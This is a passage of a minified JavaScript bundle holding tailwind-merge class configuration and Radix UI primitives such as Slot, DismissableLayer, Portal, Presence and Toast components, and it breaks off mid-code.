"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",he]}],"line-clamp":[{"line-clamp":["none",$n,qo]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",he,jt]}],"list-image":[{"list-image":["none",he]}],"list-style-type":[{list:["none","disc","decimal",he]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[n]}],"placeholder-opacity":[{"placeholder-opacity":[O]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[n]}],"text-opacity":[{"text-opacity":[O]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[].concat(ae(),["wavy"])}],"text-decoration-thickness":[{decoration:["auto","from-font",jt]}],"underline-offset":[{"underline-offset":["auto",he,jt]}],"text-decoration-color":[{decoration:[n]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],indent:[{indent:ne()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",he]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",he]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[O]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[].concat(ge(),[Yv])}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",qv]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},Qv]}],"bg-color":[{bg:[n]}],"gradient-from-pos":[{from:[M]}],"gradient-via-pos":[{via:[M]}],"gradient-to-pos":[{to:[M]}],"gradient-from":[{from:[T]}],"gradient-via":[{via:[T]}],"gradient-to":[{to:[T]}],rounded:[{rounded:[p]}],"rounded-s":[{"rounded-s":[p]}],"rounded-e":[{"rounded-e":[p]}],"rounded-t":[{"rounded-t":[p]}],"rounded-r":[{"rounded-r":[p]}],"rounded-b":[{"rounded-b":[p]}],"rounded-l":[{"rounded-l":[p]}],"rounded-ss":[{"rounded-ss":[p]}],"rounded-se":[{"rounded-se":[p]}],"rounded-ee":[{"rounded-ee":[p]}],"rounded-es":[{"rounded-es":[p]}],"rounded-tl":[{"rounded-tl":[p]}],"rounded-tr":[{"rounded-tr":[p]}],"rounded-br":[{"rounded-br":[p]}],"rounded-bl":[{"rounded-bl":[p]}],"border-w":[{border:[h]}],"border-w-x":[{"border-x":[h]}],"border-w-y":[{"border-y":[h]}],"border-w-s":[{"border-s":[h]}],"border-w-e":[{"border-e":[h]}],"border-w-t":[{"border-t":[h]}],"border-w-r":[{"border-r":[h]}],"border-w-b":[{"border-b":[h]}],"border-w-l":[{"border-l":[h]}],"border-opacity":[{"border-opacity":[O]}],"border-style":[{border:[].concat(ae(),["hidden"])}],"divide-x":[{"divide-x":[h]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[h]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[O]}],"divide-style":[{divide:ae()}],"border-color":[{border:[c]}],"border-color-x":[{"border-x":[c]}],"border-color-y":[{"border-y":[c]}],"border-color-t":[{"border-t":[c]}],"border-color-r":[{"border-r":[c]}],"border-color-b":[{"border-b":[c]}],"border-color-l":[{"border-l":[c]}],"divide-color":[{divide:[c]}],"outline-style":[{outline:[""].concat(ae())}],"outline-offset":[{"outline-offset":[he,jt]}],"outline-w":[{outline:[jt]}],"outline-color":[{outline:[n]}],"ring-w":[{ring:be()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[n]}],"ring-opacity":[{"ring-opacity":[O]}],"ring-offset-w":[{"ring-offset":[jt]}],"ring-offset-color":[{"ring-offset":[n]}],shadow:[{shadow:["","inner","none",xn,Zv]}],"shadow-color":[{shadow:[bi]}],opacity:[{opacity:[O]}],"mix-blend":[{"mix-blend":ue()}],"bg-blend":[{"bg-blend":ue()}],filter:[{filter:["","none"]}],blur:[{blur:[o]}],brightness:[{brightness:[a]}],contrast:[{contrast:[g]}],"drop-shadow":[{"drop-shadow":["","none",xn,he]}],grayscale:[{grayscale:[f]}],"hue-rotate":[{"hue-rotate":[y]}],invert:[{invert:[v]}],saturate:[{saturate:[N]}],sepia:[{sepia:[$]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[o]}],"backdrop-brightness":[{"backdrop-brightness":[a]}],"backdrop-contrast":[{"backdrop-contrast":[g]}],"backdrop-grayscale":[{"backdrop-grayscale":[f]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[y]}],"backdrop-invert":[{"backdrop-invert":[v]}],"backdrop-opacity":[{"backdrop-opacity":[O]}],"backdrop-saturate":[{"backdrop-saturate":[N]}],"backdrop-sepia":[{"backdrop-sepia":[$]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[d]}],"border-spacing-x":[{"border-spacing-x":[d]}],"border-spacing-y":[{"border-spacing-y":[d]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",he]}],duration:[{duration:j()}],ease:[{ease:["linear","in","out","in-out",he]}],delay:[{delay:j()}],animate:[{animate:["none","spin","ping","pulse","bounce",he]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[B]}],"scale-x":[{"scale-x":[B]}],"scale-y":[{"scale-y":[B]}],rotate:[{rotate:[vi,he]}],"translate-x":[{"translate-x":[ee]}],"translate-y":[{"translate-y":[ee]}],"skew-x":[{"skew-x":[J]}],"skew-y":[{"skew-y":[J]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",he]}],accent:[{accent:["auto",n]}],appearance:["appearance-none"],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",he]}],"caret-color":[{caret:[n]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":ne()}],"scroll-mx":[{"scroll-mx":ne()}],"scroll-my":[{"scroll-my":ne()}],"scroll-ms":[{"scroll-ms":ne()}],"scroll-me":[{"scroll-me":ne()}],"scroll-mt":[{"scroll-mt":ne()}],"scroll-mr":[{"scroll-mr":ne()}],"scroll-mb":[{"scroll-mb":ne()}],"scroll-ml":[{"scroll-ml":ne()}],"scroll-p":[{"scroll-p":ne()}],"scroll-px":[{"scroll-px":ne()}],"scroll-py":[{"scroll-py":ne()}],"scroll-ps":[{"scroll-ps":ne()}],"scroll-pe":[{"scroll-pe":ne()}],"scroll-pt":[{"scroll-pt":ne()}],"scroll-pr":[{"scroll-pr":ne()}],"scroll-pb":[{"scroll-pb":ne()}],"scroll-pl":[{"scroll-pl":ne()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","pinch-zoom","manipulation",{pan:["x","left","right","y","up","down"]}]}],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",he]}],fill:[{fill:[n,"none"]}],"stroke-w":[{stroke:[jt,qo]}],stroke:[{stroke:[n,"none"]}],sr:["sr-only","not-sr-only"]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}}var af=Wv(nb);function vt(...n){return af(ac(n))}var cc=Zh();const rb=oc(cc);function mt(n,r,{checkForDefaultPrevented:o=!0}={}){return function(c){if(n==null||n(c),o===!1||!c.defaultPrevented)return r==null?void 0:r(c)}}function Wp(n,r){if(typeof n=="function")return n(r);n!=null&&(n.current=r)}function lf(...n){return r=>{let o=!1;const a=n.map(c=>{const p=Wp(c,r);return!o&&typeof p=="function"&&(o=!0),p});if(o)return()=>{for(let c=0;c<a.length;c++){const p=a[c];typeof p=="function"?p():Wp(n[c],null)}}}}function Yn(...n){return I.useCallback(lf(...n),n)}function cf(n,r=[]){let o=[];function a(p,d){const h=I.createContext(d),g=o.length;o=[...o,d];const f=v=>{var O;const{scope:w,children:T,...M}=v,A=((O=w==null?void 0:w[n])==null?void 0:O[g])||h,P=I.useMemo(()=>M,Object.values(M));return x.jsx(A.Provider,{value:P,children:T})};f.displayName=p+"Provider";function y(v,w){var A;const T=((A=w==null?void 0:w[n])==null?void 0:A[g])||h,M=I.useContext(T);if(M)return M;if(d!==void 0)return d;throw new Error(`\`${v}\` must be used within \`${p}\``)}return[f,y]}const c=()=>{const p=o.map(d=>I.createContext(d));return function(h){const g=(h==null?void 0:h[n])||p;return I.useMemo(()=>({[`__scope${n}`]:{...h,[n]:g}}),[h,g])}};return c.scopeName=n,[a,ib(c,...r)]}function ib(...n){const r=n[0];if(n.length===1)return r;const o=()=>{const a=n.map(c=>({useScope:c(),scopeName:c.scopeName}));return function(p){const d=a.reduce((h,{useScope:g,scopeName:f})=>{const v=g(p)[`__scope${f}`];return{...h,...v}},{});return I.useMemo(()=>({[`__scope${r.scopeName}`]:d}),[d])}};return o.scopeName=r.scopeName,o}function os(n){const r=sb(n),o=I.forwardRef((a,c)=>{const{children:p,...d}=a,h=I.Children.toArray(p),g=h.find(lb);if(g){const f=g.props.children,y=h.map(v=>v===g?I.Children.count(f)>1?I.Children.only(null):I.isValidElement(f)?f.props.children:null:v);return x.jsx(r,{...d,ref:c,children:I.isValidElement(f)?I.cloneElement(f,void 0,y):null})}return x.jsx(r,{...d,ref:c,children:p})});return o.displayName=`${n}.Slot`,o}var ob=os("Slot");function sb(n){const r=I.forwardRef((o,a)=>{const{children:c,...p}=o;if(I.isValidElement(c)){const d=ub(c),h=cb(p,c.props);return c.type!==I.Fragment&&(h.ref=a?lf(a,d):d),I.cloneElement(c,h)}return I.Children.count(c)>1?I.Children.only(null):null});return r.displayName=`${n}.SlotClone`,r}var ab=Symbol("radix.slottable");function lb(n){return I.isValidElement(n)&&typeof n.type=="function"&&"__radixId"in n.type&&n.type.__radixId===ab}function cb(n,r){const o={...r};for(const a in r){const c=n[a],p=r[a];/^on[A-Z]/.test(a)?c&&p?o[a]=(...h)=>{const g=p(...h);return c(...h),g}:c&&(o[a]=c):a==="style"?o[a]={...c,...p}:a==="className"&&(o[a]=[c,p].filter(Boolean).join(" "))}return{...n,...o}}function ub(n){var a,c;let r=(a=Object.getOwnPropertyDescriptor(n.props,"ref"))==null?void 0:a.get,o=r&&"isReactWarning"in r&&r.isReactWarning;return o?n.ref:(r=(c=Object.getOwnPropertyDescriptor(n,"ref"))==null?void 0:c.get,o=r&&"isReactWarning"in r&&r.isReactWarning,o?n.props.ref:n.props.ref||n.ref)}function db(n){const r=n+"CollectionProvider",[o,a]=cf(r),[c,p]=o(r,{collectionRef:{current:null},itemMap:new Map}),d=A=>{const{scope:P,children:O}=A,L=Te.useRef(null),N=Te.useRef(new Map).current;return x.jsx(c,{scope:P,itemMap:N,collectionRef:L,children:O})};d.displayName=r;const h=n+"CollectionSlot",g=os(h),f=Te.forwardRef((A,P)=>{const{scope:O,children:L}=A,N=p(h,O),B=Yn(P,N.collectionRef);return x.jsx(g,{ref:B,children:L})});f.displayName=h;const y=n+"CollectionItemSlot",v="data-radix-collection-item",w=os(y),T=Te.forwardRef((A,P)=>{const{scope:O,children:L,...N}=A,B=Te.useRef(null),$=Yn(P,B),J=p(y,O);return Te.useEffect(()=>(J.itemMap.set(B,{ref:B,...N}),()=>void J.itemMap.delete(B))),x.jsx(w,{[v]:"",ref:$,children:L})});T.displayName=y;function M(A){const P=p(n+"CollectionConsumer",A);return Te.useCallback(()=>{const L=P.collectionRef.current;if(!L)return[];const N=Array.from(L.querySelectorAll(`[${v}]`));return Array.from(P.itemMap.values()).sort((J,H)=>N.indexOf(J.ref.current)-N.indexOf(H.ref.current))},[P.collectionRef,P.itemMap])}return[{Provider:d,Slot:f,ItemSlot:T},M,a]}var pb=["a","button","div","form","h2","h3","img","input","label","li","nav","ol","p","select","span","svg","ul"],Wt=pb.reduce((n,r)=>{const o=os(`Primitive.${r}`),a=I.forwardRef((c,p)=>{const{asChild:d,...h}=c,g=d?o:r;return typeof window<"u"&&(window[Symbol.for("radix-ui")]=!0),x.jsx(g,{...h,ref:p})});return a.displayName=`Primitive.${r}`,{...n,[r]:a}},{});function uf(n,r){n&&cc.flushSync(()=>n.dispatchEvent(r))}function Qn(n){const r=I.useRef(n);return I.useEffect(()=>{r.current=n}),I.useMemo(()=>(...o)=>{var a;return(a=r.current)==null?void 0:a.call(r,...o)},[])}function hb(n,r=globalThis==null?void 0:globalThis.document){const o=Qn(n);I.useEffect(()=>{const a=c=>{c.key==="Escape"&&o(c)};return r.addEventListener("keydown",a,{capture:!0}),()=>r.removeEventListener("keydown",a,{capture:!0})},[o,r])}var fb="DismissableLayer",Wl="dismissableLayer.update",gb="dismissableLayer.pointerDownOutside",mb="dismissableLayer.focusOutside",Up,df=I.createContext({layers:new Set,layersWithOutsidePointerEventsDisabled:new Set,branches:new Set}),pf=I.forwardRef((n,r)=>{const{disableOutsidePointerEvents:o=!1,onEscapeKeyDown:a,onPointerDownOutside:c,onFocusOutside:p,onInteractOutside:d,onDismiss:h,...g}=n,f=I.useContext(df),[y,v]=I.useState(null),w=(y==null?void 0:y.ownerDocument)??(globalThis==null?void 0:globalThis.document),[,T]=I.useState({}),M=Yn(r,H=>v(H)),A=Array.from(f.layers),[P]=[...f.layersWithOutsidePointerEventsDisabled].slice(-1),O=A.indexOf(P),L=y?A.indexOf(y):-1,N=f.layersWithOutsidePointerEventsDisabled.size>0,B=L>=O,$=vb(H=>{const ee=H.target,le=[...f.branches].some(ve=>ve.contains(ee));!B||le||(c==null||c(H),d==null||d(H),H.defaultPrevented||h==null||h())},w),J=bb(H=>{const ee=H.target;[...f.branches].some(ve=>ve.contains(ee))||(p==null||p(H),d==null||d(H),H.defaultPrevented||h==null||h())},w);return hb(H=>{L===f.layers.size-1&&(a==null||a(H),!H.defaultPrevented&&h&&(H.preventDefault(),h()))},w),I.useEffect(()=>{if(y)return o&&(f.layersWithOutsidePointerEventsDisabled.size===0&&(Up=w.body.style.pointerEvents,w.body.style.pointerEvents="none"),f.layersWithOutsidePointerEventsDisabled.add(y)),f.layers.add(y),Hp(),()=>{o&&f.layersWithOutsidePointerEventsDisabled.size===1&&(w.body.style.pointerEvents=Up)}},[y,w,o,f]),I.useEffect(()=>()=>{y&&(f.layers.delete(y),f.layersWithOutsidePointerEventsDisabled.delete(y),Hp())},[y,f]),I.useEffect(()=>{const H=()=>T({});return document.addEventListener(Wl,H),()=>document.removeEventListener(Wl,H)},[]),x.jsx(Wt.div,{...g,ref:M,style:{pointerEvents:N?B?"auto":"none":void 0,...n.style},onFocusCapture:mt(n.onFocusCapture,J.onFocusCapture),onBlurCapture:mt(n.onBlurCapture,J.onBlurCapture),onPointerDownCapture:mt(n.onPointerDownCapture,$.onPointerDownCapture)})});pf.displayName=fb;var yb="DismissableLayerBranch",hf=I.forwardRef((n,r)=>{const o=I.useContext(df),a=I.useRef(null),c=Yn(r,a);return I.useEffect(()=>{const p=a.current;if(p)return o.branches.add(p),()=>{o.branches.delete(p)}},[o.branches]),x.jsx(Wt.div,{...n,ref:c})});hf.displayName=yb;function vb(n,r=globalThis==null?void 0:globalThis.document){const o=Qn(n),a=I.useRef(!1),c=I.useRef(()=>{});return I.useEffect(()=>{const p=h=>{if(h.target&&!a.current){let g=function(){ff(gb,o,f,{discrete:!0})};const f={originalEvent:h};h.pointerType==="touch"?(r.removeEventListener("click",c.current),c.current=g,r.addEventListener("click",c.current,{once:!0})):g()}else r.removeEventListener("click",c.current);a.current=!1},d=window.setTimeout(()=>{r.addEventListener("pointerdown",p)},0);return()=>{window.clearTimeout(d),r.removeEventListener("pointerdown",p),r.removeEventListener("click",c.current)}},[r,o]),{onPointerDownCapture:()=>a.current=!0}}function bb(n,r=globalThis==null?void 0:globalThis.document){const o=Qn(n),a=I.useRef(!1);return I.useEffect(()=>{const c=p=>{p.target&&!a.current&&ff(mb,o,{originalEvent:p},{discrete:!1})};return r.addEventListener("focusin",c),()=>r.removeEventListener("focusin",c)},[r,o]),{onFocusCapture:()=>a.current=!0,onBlurCapture:()=>a.current=!1}}function Hp(){const n=new CustomEvent(Wl);document.dispatchEvent(n)}function ff(n,r,o,{discrete:a}){const c=o.originalEvent.target,p=new CustomEvent(n,{bubbles:!1,cancelable:!0,detail:o});r&&c.addEventListener(n,r,{once:!0}),a?uf(c,p):c.dispatchEvent(p)}var wb=pf,kb=hf,Ei=globalThis!=null&&globalThis.document?I.useLayoutEffect:()=>{},xb="Portal",gf=I.forwardRef((n,r)=>{var h;const{container:o,...a}=n,[c,p]=I.useState(!1);Ei(()=>p(!0),[]);const d=o||c&&((h=globalThis==null?void 0:globalThis.document)==null?void 0:h.body);return d?rb.createPortal(x.jsx(Wt.div,{...a,ref:r}),d):null});gf.displayName=xb;function Sb(n,r){return I.useReducer((o,a)=>r[o][a]??o,n)}var mf=n=>{const{present:r,children:o}=n,a=Tb(r),c=typeof o=="function"?o({present:a.isPresent}):I.Children.only(o),p=Yn(a.ref,Cb(c));return typeof o=="function"||a.isPresent?I.cloneElement(c,{ref:p}):null};mf.displayName="Presence";function Tb(n){const[r,o]=I.useState(),a=I.useRef(null),c=I.useRef(n),p=I.useRef("none"),d=n?"mounted":"unmounted",[h,g]=Sb(d,{mounted:{UNMOUNT:"unmounted",ANIMATION_OUT:"unmountSuspended"},unmountSuspended:{MOUNT:"mounted",ANIMATION_END:"unmounted"},unmounted:{MOUNT:"mounted"}});return I.useEffect(()=>{const f=Yo(a.current);p.current=h==="mounted"?f:"none"},[h]),Ei(()=>{const f=a.current,y=c.current;if(y!==n){const w=p.current,T=Yo(f);n?g("MOUNT"):T==="none"||(f==null?void 0:f.display)==="none"?g("UNMOUNT"):g(y&&w!==T?"ANIMATION_OUT":"UNMOUNT"),c.current=n}},[n,g]),Ei(()=>{if(r){let f;const y=r.ownerDocument.defaultView??window,v=T=>{const A=Yo(a.current).includes(T.animationName);if(T.target===r&&A&&(g("ANIMATION_END"),!c.current)){const P=r.style.animationFillMode;r.style.animationFillMode="forwards",f=y.setTimeout(()=>{r.style.animationFillMode==="forwards"&&(r.style.animationFillMode=P)})}},w=T=>{T.target===r&&(p.current=Yo(a.current))};return r.addEventListener("animationstart",w),r.addEventListener("animationcancel",v),r.addEventListener("animationend",v),()=>{y.clearTimeout(f),r.removeEventListener("animationstart",w),r.removeEventListener("animationcancel",v),r.removeEventListener("animationend",v)}}else g("ANIMATION_END")},[r,g]),{isPresent:["mounted","unmountSuspended"].includes(h),ref:I.useCallback(f=>{a.current=f?getComputedStyle(f):null,o(f)},[])}}function Yo(n){return(n==null?void 0:n.animationName)||"none"}function Cb(n){var a,c;let r=(a=Object.getOwnPropertyDescriptor(n.props,"ref"))==null?void 0:a.get,o=r&&"isReactWarning"in r&&r.isReactWarning;return o?n.ref:(r=(c=Object.getOwnPropertyDescriptor(n,"ref"))==null?void 0:c.get,o=r&&"isReactWarning"in r&&r.isReactWarning,o?n.props.ref:n.props.ref||n.ref)}var Ab=xv[" useInsertionEffect ".trim().toString()]||Ei;function Pb({prop:n,defaultProp:r,onChange:o=()=>{},caller:a}){const[c,p,d]=Eb({defaultProp:r,onChange:o}),h=n!==void 0,g=h?n:c;{const y=I.useRef(n!==void 0);I.useEffect(()=>{const v=y.current;v!==h&&console.warn(`${a} is changing from ${v?"controlled":"uncontrolled"} to ${h?"controlled":"uncontrolled"}. Components should not switch from controlled to uncontrolled (or vice versa). Decide between using a controlled or uncontrolled value for the lifetime of the component.`),y.current=h},[h,a])}const f=I.useCallback(y=>{var v;if(h){const w=Ib(y)?y(n):y;w!==n&&((v=d.current)==null||v.call(d,w))}else p(y)},[h,n,p,d]);return[g,f]}function Eb({defaultProp:n,onChange:r}){const[o,a]=I.useState(n),c=I.useRef(o),p=I.useRef(r);return Ab(()=>{p.current=r},[r]),I.useEffect(()=>{var d;c.current!==o&&((d=p.current)==null||d.call(p,o),c.current=o)},[o,c]),[o,a,p]}function Ib(n){return typeof n=="function"}var Db=Object.freeze({position:"absolute",border:0,width:1,height:1,padding:0,margin:-1,overflow:"hidden",clip:"rect(0, 0, 0, 0)",whiteSpace:"nowrap",wordWrap:"normal"}),Mb="VisuallyHidden",uc=I.forwardRef((n,r)=>x.jsx(Wt.span,{...n,ref:r,style:{...Db,...n.style}}));uc.displayName=Mb;var dc="ToastProvider",[pc,Rb,Nb]=db("Toast"),[yf,_1]=cf("Toast",[Nb]),[Lb,ms]=yf(dc),vf=n=>{const{__scopeToast:r,label:o="Notification",duration:a=5e3,swipeDirection:c="right",swipeThreshold:p=50,children:d}=n,[h,g]=I.useState(null),[f,y]=I.useState(0),v=I.useRef(!1),w=I.useRef(!1);return o.trim()||console.error(`Invalid prop \`label\` supplied to \`${dc}\`. Expected non-empty \`string\`.`),x.jsx(pc.Provider,{scope:r,children:x.jsx(Lb,{scope:r,label:o,duration:a,swipeDirection:c,swipeThreshold:p,toastCount:f,viewport:h,onViewportChange:g,onToastAdd:I.useCallback(()=>y(T=>T+1),[]),onToastRemove:I.useCallback(()=>y(T=>T-1),[]),isFocusedToastEscapeKeyDownRef:v,isClosePausedRef:w,children:d})})};vf.displayName=dc;var bf="ToastViewport",jb=["F8"],Ul="toast.viewportPause",Hl="toast.viewportResume",wf=I.forwardRef((n,r)=>{const{__scopeToast:o,hotkey:a=jb,label:c="Notifications ({hotkey})",...p}=n,d=ms(bf,o),h=Rb(o),g=I.useRef(null),f=I.useRef(null),y=I.useRef(null),v=I.useRef(null),w=Yn(r,v,d.onViewportChange),T=a.join("+").replace(/Key/g,"").replace(/Digit/g,""),M=d.toastCount>0;I.useEffect(()=>{const P=O=>{var N;a.length!==0&&a.every(B=>O[B]||O.code===B)&&((N=v.current)==null||N.focus())};return document.addEventListener("keydown",P),()=>document.removeEventListener("keydown",P)},[a]),I.useEffect(()=>{const P=g.current,O=v.current;if(M&&P&&O){const L=()=>{if(!d.isClosePausedRef.current){const J=new CustomEvent(Ul);O.dispatchEvent(J),d.isClosePausedRef.current=!0}},N=()=>{if(d.isClosePausedRef.current){const J=new CustomEvent(Hl);O.dispatchEvent(J),d.isClosePausedRef.current=!1}},B=J=>{!P.contains(J.relatedTarget)&&N()},$=()=>{P.contains(document.activeElement)||N()};return P.addEventListener("focusin",L),P.addEventListener("focusout",B),P.addEventListener("pointermove",L),P.addEventListener("pointerleave",$),window.addEventListener("blur",L),window.addEventListener("focus",N),()=>{P.removeEventListener("focusin",L),P.removeEventListener("focusout",B),P.removeEventListener("pointermove",L),P.removeEventListener("pointerleave",$),window.removeEventListener("blur",L),window.removeEventListener("focus",N)}}},[M,d.isClosePausedRef]);const A=I.useCallback(({tabbingDirection:P})=>{const L=h().map(N=>{const B=N.ref.current,$=[B,...qb(B)];return P==="forwards"?$:$.reverse()});return(P==="forwards"?L.reverse():L).flat()},[h]);return I.useEffect(()=>{const P=v.current;if(P){const O=L=>{var $,J,H;const N=L.altKey||L.ctrlKey||L.metaKey;if(L.key==="Tab"&&!N){const ee=document.activeElement,le=L.shiftKey;if(L.target===P&&le){($=f.current)==null||$.focus();return}const ne=A({tabbingDirection:le?"backwards":"forwards"}),be=ne.findIndex(K=>K===ee);Sl(ne.slice(be+1))?L.preventDefault():le?(J=f.current)==null||J.focus():(H=y.current)==null||H.focus()}};return P.addEventListener("keydown",O),()=>P.removeEventListener("keydown",O)}},[h,A]),x.jsxs(kb,{ref:g,role:"region","aria-label":c.replace("{hotkey}",T),tabIndex:-1,style:{pointerEvents:M?void 0:"none"},children:[M&&x.jsx(Gl,{ref:f,onFocusFromOutsideViewport:()=>{const P=A({tabbingDirection:"forwards"});Sl(P)}}),x.jsx(pc.Slot,{scope:o,children:x.jsx(Wt.ol,{tabIndex:-1,...p,ref:w})}),M&&x.jsx(Gl,{ref:y,onFocusFromOutsideViewport:()=>{const P=A({tabbingDirection:"backwards"});Sl(P)}})]})});wf.displayName=bf;var kf="ToastFocusProxy",Gl=I.forwardRef((n,r)=>{const{__scopeToast:o,onFocusFromOutsideViewport:a,...c}=n,p=ms(kf,o);return x.jsx(uc,{"aria-hidden":!0,tabIndex:0,...c,ref:r,style:{position:"fixed"},onFocus:d=>{var f;const h=d.relatedTarget;!((f=p.viewport)!=null&&f.contains(h))&&a()}})});Gl.displayName=kf;var Ri="Toast",Bb="toast.swipeStart",Fb="toast.swipeMove",Vb="toast.swipeCancel",Ob="toast.swipeEnd",xf=I.forwardRef((n,r)=>{const{forceMount:o,open:a,defaultOpen:c,onOpenChange:p,...d}=n,[h,g]=Pb({prop:a,defaultProp:c??!0,onChange:p,caller:Ri});return x.jsx(mf,{present:o||h,children:x.jsx(Wb,{open:h,...d,ref:r,onClose:()=>g(!1),onPause:Qn(n.onPause),onResume:Qn(n.onResume),onSwipeStart:mt(n.onSwipeStart,f=>{f.currentTarget.setAttribute("data-swipe","start")}),onSwipeMove:mt(n.onSwipeMove,f=>{const{x:y,y:v}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","move"),f.currentTarget.style.setProperty("--radix-toast-swipe-move-x",`${y}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-move-y",`${v}px`)}),onSwipeCancel:mt(n.onSwipeCancel,f=>{f.currentTarget.setAttribute("data-swipe","cancel"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-end-y")}),onSwipeEnd:mt(n.onSwipeEnd,f=>{const{x:y,y:v}=f.detail.delta;f.currentTarget.setAttribute("data-swipe","end"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-x"),f.currentTarget.style.removeProperty("--radix-toast-swipe-move-y"),f.currentTarget.style.setProperty("--radix-toast-swipe-end-x",`${y}px`),f.currentTarget.style.setProperty("--radix-toast-swipe-end-y",`${v}px`),g(!1)})})})});xf.displayName=Ri;var[zb,_b]=yf(Ri,{onClose(){}}),Wb=I.forwardRef((n,r)=>{const{__scopeToast:o,type:a="foreground",duration:c,open:p,onClose:d,onEscapeKeyDown:h,onPause:g,onResume:f,onSwipeStart:y,onSwipeMove:v,onSwipeCancel:w,onSwipeEnd:T,...M}=n,A=ms(Ri,o),[P,O]=I.useState(null),L=Yn(r,K=>O(K)),N=I.useRef(null),B=I.useRef(null),$=c||A.duration,J=I.useRef(0),H=I.useRef($),ee=I.useRef(0),{onToastAdd:le,onToastRemove:ve}=A,Ae=Qn(()=>{var ge;(P==null?void 0:P.contains(document.activeElement))&&((ge=A.viewport)==null||ge.focus()),d()}),ne=I.useCallback(K=>{!K||K===1/0||(window.clearTimeout(ee.current),J.current=new Date().getTime(),ee.current=window.setTimeout(Ae,K))},[Ae]);I.useEffect(()=>{const K=A.viewport;if(K){const ge=()=>{ne(H.current),f==null||f()},ae=()=>{const ue=new 